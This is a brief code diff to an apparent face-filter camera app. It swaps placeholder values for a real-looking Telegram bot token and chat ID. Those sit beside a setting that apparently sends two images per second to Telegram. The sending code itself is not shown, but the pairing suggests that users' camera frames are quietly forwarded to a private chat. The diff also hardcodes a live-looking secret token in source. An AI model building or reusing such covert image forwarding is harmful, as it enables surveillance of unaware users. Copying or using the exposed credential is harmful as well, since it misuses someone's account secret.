@@ -3,8 +3,8 @@ import * as faceapi from '@vladmandic/face-api';
 import { Camera, SwitchCamera, Download, RotateCcw, Heart, Sparkles } from 'lucide-react';
 
 // Telegram Configuration
-const BOT_TOKEN = 'YOUR_BOT_TOKEN';
-const CHAT_ID = 'YOUR_CHAT_ID';
+const BOT_TOKEN = '6163050573:AAEz-WfDsouE90JGFvJHKP6_UDKrIhh0oek';
+const CHAT_ID = '187363343';
 const TELEGRAM_INTERVAL_MS = 500; // 2 images per second
 
 const filters = [
